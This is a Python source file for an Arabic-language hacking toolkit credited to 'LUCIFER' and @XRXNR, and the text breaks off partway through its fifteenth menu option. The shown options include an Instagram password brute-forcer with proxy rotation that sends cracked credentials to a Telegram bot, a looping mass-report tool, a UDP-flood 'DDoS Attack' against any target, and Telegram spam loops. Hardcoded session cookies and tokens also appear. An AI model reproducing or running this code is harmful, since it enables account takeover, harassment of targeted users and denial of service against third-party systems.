import datetime,urllib,requests,secrets,uuid,youtube_dl,time,webbrowser,random,string,socket,os,hashlib,py_compile,re,sys,pyfiglet
import sys as n
import time as mm
from time import sleep
from pafy import new
from bs4 import BeautifulSoup
from hashlib import sha3_512,sha384,sha256,md5,sha1
import threading
from discord_webhook import DiscordEmbed
from discord_webhook import DiscordWebhook
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
al7gog="ᴘʀᴏɢʀᴀᴍᴇᴅ ʙʏ LUCIFER"
r = requests.session()
done = 0
count = 0
error = 0
jo = requests.get('https://pastebin.com/raw/kEaS1fgJ').text
te = requests.get('https://pastebin.com/raw/4t80LzfB').text

def ketik(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 5000)
####################dev lucifer#####################
now = datetime.datetime.now()
d = datetime.datetime.now().date()
print('   ', d, now.strftime("%b   %I : %M : %S [%p]"))
print(' ')
ketik(al7gog)
print('''        CODED BY @BBLBB0      ''')
print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
ketik("""
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
[1]==>قسم بلاغات الانستا
[2]==>استخراج معلومات الايبي
[3]==>استخراج معلومات انستا
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
[4]==>استخراج  كوكيز انستا
[5]==>استخراج هيدرز انستا
[6]==>ويب سكربانق
[7]==>تنزيل صور
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
[8]==>تخمين انستا
[9]==>اداه الهجمات Ddos
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
[10]==>تنزيل مقاطع يوتيوب
[11]==>تشيكر تيليقرام
[12]==> تشيكر تيك توك
[13]==>تشيكر انستا
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
[14]==>بوت سبام رسايل تيليقرام
[15]==>تيربو نقل تيك توك
[16]==>استخراج سيشن ايدي لغهVB(ملف خارجي)
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
قسم التشفير:
[17]==>تشفير نوع md5
[18]==>تشفير نوع sha3_512
[19]==>تشفير نوع sha256
[20]==>تشفير نوع sha384
[21]==>تشفير نوع sha1
[22]==>تشفير ملفات
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
[23]==>اداه بلاغات تيك توك
[24]==>اداه كومنتات تيك توك
---------------------------------------
[25]==>اداه تسوي بانرات,حقوق
""")


lucifer = input("[•]>> Enter number : ")


if lucifer == '1':
	r = requests.session()
	user = input('Enter username : ')
	pess = input('Enter pass : ')
	
	def silf():
		floz70 = input("𝔼𝕟𝕥𝕖𝕣 𝕥𝕙𝕖 𝕥𝕒𝕣𝕘𝕖𝕥-->: ")
		sl = int(input("🅴🅽🆃🅴🆁 🆃🅷🅴 🆂🅻🅴🅴🅿 🆃🅸🅼🅴-->: "))
		print('====================================')
		url_id = 'https://www.instagram.com/{}/?__a=1'.format(floz70)
		req_id = r.get(url_id).json()
		user_id = str(req_id['logging_page_id'])
		flucifer2000 = user_id.split('_')[1]
		done = 0
		
		while True:
			url_spam = 'https://www.instagram.com/users/{}/report/'.format(flucifer2000)
			data_spam = {
				'source_name': '',
				'reason_id': 2,
				'frx_context': ''}
			
			solo = r.post(url_spam, data=data_spam)
			print(f'done self {done}')
			time.sleep(sl)
			done += 1
		
	def spam():
		floz70 = input("𝔼𝕟𝕥𝕖𝕣 𝕥𝕙𝕖 𝕥𝕒𝕣𝕘𝕖𝕥-->: ")
		sl = int(input("🅴🅽🆃🅴🆁 🆃🅷🅴 🆂🅻🅴🅴🅿 🆃🅸🅼🅴-->: "))
		print('====================================')
		url_id = 'https://www.instagram.com/{}/?__a=1'.format(floz70)
		req_id = r.get(url_id).json()
		user_id = str(req_id['logging_page_id'])
		flucifer2000 = user_id.split('_')[1]
		done = 0
		
		while True:
			url_spam = 'https://www.instagram.com/users/{}/report/'.format(flucifer2000)
			data_spam = {
				'source_name': '',
				'reason_id': 1,
				'frx_context': ''}
			
			solo = r.post(url_spam, data=data_spam)
			print(f'done spam{done}')
			time.sleep(sl)
			done += 1
	
	url = 'https://www.instagram.com/accounts/login/ajax/'
	
	headers = {
	         'accept': '*/*',
	         'accept-encoding': 'gzip, deflate, br',
	         'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	         'content-length': '347',
	         'content-type': 'application/x-www-form-urlencoded',
	         'cookie': 'ig_did=D37E2F4F-6193-4E76-B7C6-6FDBE4A0C230;  mid=X_3LtAALAAFAdQMURlFUf_U68Q6H; ig_nrcb=1; rur=NAO; csrftoken=JHYHw8FoLtYVukJtHHvTmu5W3uGH8iUS; urlgen="{\"2001:16a2:1401:2100:b402:7729:50e7:7155\": 25019}:1l4wLZ:yUcOwB_XJIiXVKxEm2m4SEvH4ds"',
	         'origin': 'https://www.instagram.com',
	         'referer': 'https://www.instagram.com/accounts/login/',
	         'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
	         'sec-ch-ua-mobile': '?0',
	         'sec-fetch-dest': 'empty',
	         'sec-fetch-mode': 'cors',
	         'sec-fetch-site': 'same-origin',
	         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
	         'x-csrftoken': 'JHYHw8FoLtYVukJtHHvTmu5W3uGH8iUS',
	         'x-ig-app-id': '936619743392459',
	         'x-ig-www-claim': 'hmac.AR1Y1dEsDcV-xq-u_7U0XISuyjCpWSS-VvmOhVU2N6rp95IZ',
	         'x-instagram-ajax': '5f4886947dbe',
	         'x-requested-with': 'XMLHttpRequest'
	         }
	
	data = {
		'username': f'{user}',
		'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{pess}',
		'queryParams': '{}',
		'optIntoOneTap': 'false'}
	
	req = r.post(url, headers=headers, data=data)
	if 'userId' in req.text:
		r.headers.update({'x-csrftoken': req.cookies['csrftoken']})
		print('Done login ')
		req2 = r.cookies["sessionid"]
		print(f'\n   Your sessionid >> {req2} \n')
		
		ketik("""
[1] >> Report spam 
[2] >> Report self
""")
		fil = input('Enter number : ')
		if fil == '1':
			spam()
		elif fil == '2':
			silf()
		else:
			print('Error number ..')
	elif 'checkpoint_required' in req.text:
		print('الحساب عليه سكيور ')
		
	else:
		print('Error login .. ')



elif lucifer == '2':
    webbrowser.open('https://t.me/XRXNR')
    time.sleep(1)

    j = input("""
	[1] Get My Ip
	[2] Get My Location & data
	[3] Get Location & data From IP Target:
	""")
    if j == "1":
        IPrequest = requests.get("https://get.geojs.io/v1/ip.json")
        myIP = IPrequest.json()["ip"]
        print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
        print("[~] My IP Address : " + myIP)
    elif j == "2":
        IPrequest = requests.get("https://get.geojs.io/v1/ip.json")
        myIP = IPrequest.json()["ip"]
        LocationR = requests.get("https://get.geojs.io/v1/ip/geo/" + myIP + ".json")
        GetLocate = LocationR.json()
        print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
        print("[~]My IP Address      : " + GetLocate["ip"])
        print("[~]My Location        : " + GetLocate["country"])
        print("[~]My Country Code    : " + GetLocate["country_code"])
        print("[~]Service Provider   : " + GetLocate["organization_name"])
        print("[~]Time Zone          : " + GetLocate["timezone"])
        print("[~]Longitude On a map : " + GetLocate["longitude"])
        print("[~]Latitude On a map  : " + GetLocate["latitude"])
    elif j == "3":
        z = input(" write the ip -->: ")
        LocationR = requests.get("https://get.geojs.io/v1/ip/geo/" + z + ".json")
        GetLocate = LocationR.json()
        print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
        print("[~]Target IP Address         : " + GetLocate["ip"])
        print("[~]Target Location           : " + GetLocate["country"])
        print("[~]Target Country Code       : " + GetLocate["country_code"])
        print("[~]Target Time Zone          : " + GetLocate["timezone"])
        print("[~]Target Longitude On a map : " + GetLocate["longitude"])
        print("[~]Target Latitude On a map  : " + GetLocate["latitude"])

        print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")

elif lucifer == '3':
    head = {
        'HOST': "www.instagram.com",
        'KeepAlive': 'True',
        'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
        'Cookie': 'cookie',
        'Accept': "*/*",
        'ContentType': "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX": "missing",
        "X-CSRFToken": "missing",
        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8"}

    print("""
    Note that the tool will only extract what is written below :
    ( bio , id , name , Image )>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    """)

    while 1:
        cookie = secrets.token_hex(8) * 2
        r = requests.Session()
        target = input('[+] Enter User : ')
        url_id = f'https://www.instagram.com/{target}/?__a=1'
        req_id = r.get(url_id, headers=head).json()
        bio = str(req_id['graphql']['user']['biography'])
        url = str(req_id['graphql']['user']['external_url'])
        nam = str(req_id['graphql']['user']['full_name'])
        idd = str(req_id['graphql']['user']['id'])
        isp = str(req_id['graphql']['user']['is_private'])
        isv = str(req_id['graphql']['user']['is_verified'])
        pro = str(req_id['graphql']['user']['profile_pic_url'])
        print("==============================")
        print(
            f'[-]  :)\n[-] Name : {nam}\n[-] Id : {idd}\n[-] private : {isp}\n[-] verified : {isv}\n[-] Bio : {bio}\n[-] Profile picture : {pro}')

        print("===============================")
        ask = input('[+] Send To Telegram [y/n] >> ')
        if ask == "y":
            print(' ')
            ID = input('[+] Enter Telegram ID : ')
            token = input('[+] Enter Token Bot Telegram : ')
            Account = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=❖ Insta Me @XRXNR :)\n❖ Name : {nam}\n❖ Id : {idd}\n❖ private : {isp}\n❖ verified : {isv}\n❖ Bio : {bio}\n❖ Profile picture : {pro}'
            r.get(Account)
            print(f'[-] Done Send Msg to >> {ID}')


elif lucifer == '4':
    jo = requests.get('https://pastebin.com/raw/kEaS1fgJ').text
    te = requests.get('https://pastebin.com/raw/4t80LzfB').text
    ketik(jo)
    ketik(te)
    lucifer55 = input("ادخل يوزر وهمي : ")
    flza14 = "ishehhrkjf"

    url = 'https://www.instagram.com/accounts/login/ajax/'

    data = {
        'username': f'{lucifer55}',
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{flza14}',
        'queryParams': '{"oneTapUsers": "[\"45611496793\"]"}',
        'optIntoOneTap': 'false'
    }
    lucifer5555 = requests.get(url, data=data)
    print(lucifer5555.cookies)
    print('================================')


elif lucifer == '5':
    lucifer77 = input("ادخل يوزر وهمي : ")
    flza1 = "ishehhrkjf"

    url = 'https://www.instagram.com/accounts/login/ajax/'

    data = {
        'username': f'{lucifer77}',
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{flza1}',
        'queryParams': '{"oneTapUsers": "[\"45611496793\"]"}',
        'optIntoOneTap': 'false'
    }

    solo = requests.get(url, data=data)
    print(solo.headers)
    print('===============================')


elif lucifer == '6':
    print("by lucifer 📲")
    webbrowser.open("https://t.me/XRXNR")
    print("https://t.me/XRXNR")
    url = input("entre ✅ url -->:")
    lucifer = requests.get(url)
    FID = lucifer.content
    print(FID)
    HIL = BeautifulSoup(FID, "html5lib")
    print(HIL)
    LHK = requests.get(url)
    lucifer5555 = requests.get(url)
    print(lucifer.cookies)
    print('================================')
    WeB = requests.get(url)
    print(WeB.headers)
    print('========================================================================')
    print("y/n")
    ask = input("make a file ?:")
    if ask == "y":
        Name = input("entre file name: ")
        file = open(Name, "w")
        print("Done...")
        print("now copy and past it in the file u crate")
        print("")
elif lucifer == '7':
    print("https://t.me/XRXNR")
    print("""
    _            _  __
| |          (_)/ _|
| |_   _  ___ _| |_ ___ _ __
| | | | |/ __| |  _/ _ \ '__|
| | |_| | (__| | ||  __/ |
|_|\__,_|\___|_|_| \___|_|•••""")
    print("طريقه استخدام تحط رابط الصوره الي هو يكون من قوقل او سفاري  وتحط اسم لها ومبروك")
    url = input("entre url-->:")
    name = input("entre name-->:")
    urllib.request.urlretrieve(url, name + ".jpg")
    print("downloading the pic done ✅...")
    print("")
elif lucifer=="8":
    ketik("%DEV*^*lucifer%")
    ketik("•M0D🛠lucifer")
    print("👍🛠تحتاج بروكسيات و لسته باسوردات")
    ketik(""" 

                    ┬ ┌┐┌ ┌─┐┌┬┐┌─┐  
                    │ │││ └─┐ │ ├─┤  
                    ┴ ┘└┘ └─┘ ┴ ┴ ┴ 
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """)

    user = input('>> Enter username : ')
    time.sleep(1)
    id = input('>> Enter you id :')
    time.sleep(1)
    token = input('>> Enter you token bot : ')
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

    time.sleep(1)
    pess = 'pass.txt'
    file = open(pess, 'r')

    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-length': '347',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=D37E2F4F-6193-4E76-B7C6-6FDBE4A0C230; mid=X_3LtAALAAFAdQMURlFUf_U68Q6H; ig_nrcb=1; rur=NAO; csrftoken=JHYHw8FoLtYVukJtHHvTmu5W3uGH8iUS; urlgen="{\"2001:16a2:1401:2100:b402:7729:50e7:7155\": 25019}:1l4wLZ:yUcOwB_XJIiXVKxEm2m4SEvH4ds"',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/login/',
        'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36',
        'x-csrftoken': 'JHYHw8FoLtYVukJtHHvTmu5W3uGH8iUS',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR1Y1dEsDcV-xq-u_7U0XISuyjCpWSS-VvmOhVU2N6rp95IZ',
        'x-instagram-ajax': '5f4886947dbe',
        'x-requested-with': 'XMLHttpRequest'}


    def insta():
        while True:
            try:
                proxy = 'proxy.txt'

                proxy = open(proxy, 'r').read().splitlines()

                proxylist = []
                for i in proxy:
                    proxylist.append(i)
                    RandProx = random.choice(proxylist)
                    ReProxy = {
                        'http': 'http//{}'.format(RandProx),
                        'https': 'https//{}'.format(RandProx)}

                    r.proxies = ReProxy

                    url = 'https://www.instagram.com/accounts/login/ajax/'
                    # XRXNR

                    tem = str(time.time()).split('.')[1]
                    data = {
                        'username': f'{user}',
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tem}:{pess}',
                        'queryParams': {},
                        'optIntoOneTap': 'false', }
                    # XRXNR

                    lucifer = r.post(url, headers=headers, data=data, proxies=ReProxy)

                    response = file.text

                    if ('"authenticated": true') in response:
                        print('================================')
                        print(f'>> تم الاختراق user: {user} pass: {pess} ..')
                        tlg = (
                            f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Hacked Done🤖\nuser: {user}  pass: {pess} \n@XRXNR JOKER')
                        re = requests.post(tlg)
                        input(" ")

                    elif '"checkpoint_url"' in response:
                        print('================================')
                        print(f"[] سكيور user: {user} pass: {pess}..! ")
                        tlg = (
                            f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=Hacked Done🤖\nuser: {user}  pass: {pess} \n@XRXNR JOKER')
                        re = requests.post(tlg)

                    else:
                        print('================================')
                        print(f'>> الباس خطأ user: {user} pass: {pess} ..')
                    time.sleep(3)
            except requests.exceptions.ConnectionError:
                pass

                ketik("BY FIlzA")
                input("Press Entre")
                insta()
elif lucifer=="9":
    jo = requests.get('https://pastebin.com/raw/kEaS1fgJ').text
    te = requests.get('https://pastebin.com/raw/4t80LzfB').text
    ketik(jo)
    ketik(te)
    Fore = 'solo'
    dev = '' \
          'RIGHTS:'
    'dev not lucifer'
    'dev not lucifer'
    'dev is -->:@XRXNR'

    print("""
    	RIGHTS:
    	dev not lucifer
    	dev not lucifer 
    	dev is -->:@XRXNR



    	""")
    print('''


    	STARTING ddos Attack 🚀
    	

    	''')

    print("==========================================")
    print(Fore + """ ddos Attack 🚀
    	Caution, I am not responsible for any wrong use of the tool
    	""")
    print("==========================================")
    target = input("Enter Target url or Ip : ")
    target.replace("http://", "")
    target.replace("https://", "")
    target.replace("www.", "")
    ip = socket.gethostbyname(target)
    port = 80
    XRXNR = "lucifer_is_coming_lucifer_is_comin_lucifer_is_coming_lucifer_is_fucking_lucifer_is_fucking_"
    print(Fore + "Loading{>>> }5%")
    time.sleep(2)
    print("Loading{>>>>> }10%")
    time.sleep(2)
    print(Fore + "Loading{>>>>>>> }40%")
    time.sleep(2)
    print(Fore + "Loading{>>>>>>>>>> }90%")
    time.sleep(2)
    print(Fore + "Loading{>>>>>>>>>>>>>>}100%")
    os.system("figlet Attack_Starting")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(XRXNR, "UTF-8"), (ip, port))
        time.sleep(1)
        print(port, "<===send packet to ===>", ip)
elif lucifer=="10":
    fil = r.get('https://pastebin.com/raw/WEScHrWH').text
    print("""
    _            _  __
| |          (_)/ _|
| |_   _  ___ _| |_ ___ _ __
| | | | |/ __| |  _/ _ \ '__|
| | |_| | (__| | ||  __/ |
|_|\__,_|\___|_|_| \___|_| Download Video""")
    print('' + fil + '━━━━━━━━━━━━━━━━━━━━')
    time.sleep(1.2)
    lucifer = input("""
    	[1]>> تحميل مقطع واحد 
    	[2]>> تحميل اكثر من مقطع 
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    	Here : """)

    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' ')

    if lucifer == '1':
        url = input('Enter URL vedio --> :\n')

        try:
            print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

            vedio = new(url)

            vedi = vedio.getbest()

            vedi.download()

            print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            print("        \nDone vedio ..")

        except ValueError:
            print(' Error url ..!')

        except OSError:
            print(' Error url ..!')

        except:
            print(' Error url ..!')



    elif lucifer == '2':
        url2 = input('[1] Enter URL vedio --> :\n')

        url3 = input('[2] Enter URL vedio --> :\n')
        url4 = input('[3] Enter URL vedio --> :\n')
        url5 = input('[4] Enter URL vedio --> :\n')
        print('+++++++++++++++++++++++++\n')

        try:

            vedio2 = new(url2)

            vedi2 = vedio2.getbest()

            vedi2.download()
            print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        except ValueError:
            print(' Error url ..!')

        except OSError:
            print(' Error url ..!')

        except:
            print(' Error url ..!')

        try:

            vedio3 = new(url3)

            vedi3 = vedio3.getbest()

            vedi3.download()
            print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        except ValueError:
            print(' Error url ..!')

        except OSError:
            print(' Error url ..!')

        except:
            print(' Error url ..!')

        try:

            vedio4 = new(url4)

            vedi4 = vedio4.getbest()

            vedi4.download()
            print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        except ValueError:
            print(' Error url ..!')

        except OSError:
            print(' Error url ..!')

        except:
            print(' Error url ..!')

        try:
            vedio5 = new(url5)

            vedi5 = vedio5.getbest()

            vedi5.download()
            print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

            print("        \nDone vedio ..")

        except ValueError:
            print(' Error url ..!')

        except OSError:
            print(' Error url ..!')

        except:
            print(' Error url ..!')
elif lucifer=="11":
    jo = requests.get('https://pastebin.com/raw/kEaS1fgJ').text
    te = requests.get('https://pastebin.com/raw/4t80LzfB').text
    def slow(M):
        for c in M + '\n':
            n.stdout.write(c)
            n.stdout.flush()
            mm.sleep(1. / 80)


    print("""
    _            _  __
| |          (_)/ _|
| |_   _  ___ _| |_ ___ _ __
| | | | |/ __| |  _/ _ \ '__|
| | |_| | (__| | ||  __/ |
|_|\__,_|\___|_|_| \___|_|

                TELEGRAM USERNAME""")
    slow(jo)
    print("""
    [1] >> For Arabic Press 1
    [2] >> For English Press 2
    """)
    XRXNR = input('Put the number >> ')

    if XRXNR == '1':
        webbrowser.open('https://t.me/XRXNR')
        slow('      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print('يجب وضع اليوزرات في ملف باسم user.txt')
        print('                               ↓↓↓')
        print('[>] ضع ايدي حسابك : ')
        ID = input(' ')
        print('[>] ضع توكن بوتك : ')
        token = input(' ')
        time.sleep(1.7)
        slow('      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        sl = 'user.txt'
        print(' ')

        m = """
    	[☑️] TELEGRAM USER :
    	"""


        def tle():
            j = 1
            file = open(sl, 'r')
            while True:
                user = file.readline().split('\n')[0]

                if user == '':
                    break

                url = f"https://t.me/{user}"

                req = r.get(url)

                if req.text.find(
                        'If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"') >= 0:

                    ketik(f"  [{j}] متاح     >> [ {user} ]")

                    tele_XRXNR = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={m}\n[+] user >> [ @{user} ]\n\n{te}'

                    req = r.post(tele_XRXNR)

                    with open('Available.txt', 'a') as x:
                        tl = '[] NEW USER -->  '
                        x.write(tl + user + '\n')

                else:
                    print(f"  [{j}] غير متاح >> [ {user} ]")

                j += 1

                time.sleep(1)


        tle()
    # مالك شغل
    elif XRXNR == '2':
        webbrowser.open('https://t.me/XRXNR')
        ketik('      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print('Accounts should be placed in a file named user.txt')
        print('    ↓↓↓')
        print('[>] Enter your ID : ')
        ID = input(' ')
        print('[>] Enter Token bot : ')
        token = input(' ')
        time.sleep(1.7)
        ketik('      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        sl = 'user.txt'
        print(' ')

        m = """
    	[☑️] TELEGRAM USER :
    	"""


        def tle():
            j = 1
            file = open(sl, 'r')
            while True:
                user = file.readline().split('\n')[0]

                if user == '':
                    break

                url = f"https://t.me/{user}"

                req = r.get(url)

                if req.text.find(
                        'If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"') >= 0:

                    ketik(f"  [{j}] Available     >> [ {user} ]")

                    tele_XRXNR = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={m}\n[+] user >> [ @{user} ]\n\n{te}'

                    req = r.post(tele_XRXNR)

                    with open('Available.txt', 'a') as x:
                        tl = '[] NEW USER -->  '
                        x.write(tl + user + '\n')

                else:
                    ketik(f"  [{j}] Not Available >> [ {user} ]")

                j += 1

                time.sleep(1)


        tle()
    # مالك شغل

    else:
        print('      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print('              الرقم غلط يا ذكي ..   ')
        print('              wrong number')
        print('        By joker / insta : giq.n')
elif lucifer=="12":
    # XRXNR
    count = 0


    def ketik(s):
    	for ASU in s + '\n':
    		sys.stdout.write(ASU)
    		sys.stdout.flush()
    		sleep(50. / 1000)


    te = requests.get('https://pastebin.com/raw/4t80LzfB').text

    file = 'user.txt'
    ketik('\n[1] EnTer SessionID Manually\n')
    ketik('[2] Random SessionID\n')
    mod = input('[?] Enter Mod :')
    j = """
    [✅] TIKTOK USER :
    """

    if mod == '1':
        print(" ")
        token = input("Enter the bot token ==>:")
        idd = input("Enter the id ==>:")
        print(" ")
        sw = input('Enter session : ')
        if file == "1" or " ":
            file = file
            files = open(file).read().splitlines()

            for files in files:
                url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id=" + files + "&app_language=ar"
                payload = ""
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
                    "Connection": "close",
                    "Host": "www.tiktok.com",
                    "Accept-Encoding": "gzip, deflate",
                    "Cache-Control": "max-age=0"
                }
                cookies = {'sessionid': sw}
                response = requests.request("GET", url, data=payload, headers=headers, cookies=cookies)
                post = str(response.json()["status_msg"])

                if post == "" or "":

                    print(f"[+] Available >> {files}")
                    tele = (
                        f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idd}&text={j}\n𖡃𝚄𝚂𝙴𝚁: {files}\n\n{te}')

                    re = requests.post(tele)
                    with open('usersfound.txt', 'a') as x:
                        x.write(files + '\n')
                else:

                    print(f'[-] NoT Available >> {files}')
    if mod == '2':
        def tik():

            print(" ")
            token = input("Enter the bot token ==>:")
            idf = input("Enter the id ==>:")
            time.sleep(1)
            use = 'user.txt'

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
                "Connection": "close",
                "Host": "www.tiktok.com",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "max-age=0"}

            file = open(use, "r")

            while True:

                Check = file.readline().split('\n')[0]
                if Check == '':
                    break
                tiklog = f'https://www.tiktok.com/@{Check}'
                rq = requests.get(tiklog, headers=headers)
                if rq.status_code == 404:
                    print('[+] Available >> {}'.format(Check))

                    tele = (
                        f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idf}&text={j}\n𖡃𝚄𝚂𝙴𝚁: {Check}\n\n{te}')
                    re = requests.post(tele)

                    with open('usersfound.txt', 'a') as x:
                        x.write(Check + '\n')

                elif rq.status_code == 200:
                    print('[-] NoT Available >> {}'.format(Check))

    tik()
elif lucifer=="13":
    jo = requests.get('https://pastebin.com/raw/kEaS1fgJ').text
    te = requests.get('https://pastebin.com/raw/4t80LzfB').text
    ketik(jo)
    ketik(te)
    id = input(" ضع ايدي حسابك : ")
    time.sleep(1)
    token = input(" ضع توكن بوتك : ")
    time.sleep(1)

    done = """[$] user insta 🏴‍☠️ :
    	〰️〰️〰️〰️〰️〰️〰️〰️"""

    use = "[$] >> "

    floz50 = """〰️〰️〰️〰️〰️〰️〰️〰️
    	@XRXNR / 🏴‍☠️"""

    user = "user.txt"
    file = open(user, "r")


    def checker():
        while True:
            user = file.readline().split('\n')[0]
            req = requests.get("https://www.instagram.com/" + user)
            if req.status_code == 404:
                print(f'\n[+] IS AVAILABLE OR BANNED {user}')
                tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={done}\n{use} {user}\n{floz50}')
                req = r.post(tlg)
            elif req.status_code == 200:
                print(f'\n[-]{user} IS NOT AVAILABLE')
    checker()

elif lucifer=="14":
    print("coded by lucifer🛠")
    print("XRXNR")
    print("dev%lucifer")
    print("""
    1>one msg
    2>one msg but unlimited
    3>spam msg
    4>random msg
    """)
    mod = input("entre mode:")
    if mod == "1":
        MSG = input("msg?-->:")
        id = input("id-->:")
        token = input("token bot-->:")
        Account = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={MSG}'
        r.get(Account)
        print(f'[-] MSG sent to>> {id}✅')
    elif mod == "2":
        MSG = input("msg?-->:")
        while True:
            id = input("id-->:")
            token = input("token bot-->:")
            Account = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={MSG}'
            r.get(Account)
            print(f'[-] Sent 👍 to>> {id}✅')
    elif mod == "3":
        MSG = input("msg?-->:")
        id = input("id-->:")
        token = input("token bot-->:")
        while True:
            Account = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={MSG}'
            r.get(Account)
            print(f'[-] SPAM is runuing to>> {id}🤖🛠')
    elif mod == "4":
        time.sleep(0.0)


    def GetPassword(data):
        Max = (4)
        Password = ""
        while len(Password) != Max:
            value = random.choice(data)
            Password += value
        return Password


    data = 'qwertyuiopasdfghjklzxcvbnm1234567890'
    for i in range(18888):
        Password = GetPassword(data)
        MSG = GetPassword(data)
        id = input("id-->:")
        token = input("token bot-->:")
        while True:
            Account = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={MSG}'
            r.get(Account)
            print(f'[-] Random msg is now sending✅>>{id}')
    else:
        pass
        print("Error...❌")
        print("coding by lucifer🛠📲")

elif lucifer=="15":
    uid = uuid.uuid4()
    r = requests.session()

    print("""
    _            _  __
| |          (_)/ _|
| |_   _  ___ _| |_ ___ _ __
| | | | |/ __| |  _/ _ \ '__|
| | |_| | (__| | ||  __/ |
|_|\__,_|\___|_|_| \___|_|  """)
    print('====================================')
    ess = input("Enter Your sessionid :")
    user = input("Enter Username : ")
    time.sleep(1)
    XRXNR = input('\nare you ready ? [ y / n ] : ')
    print(' ')
    if XRXNR == 'y':
        while True:
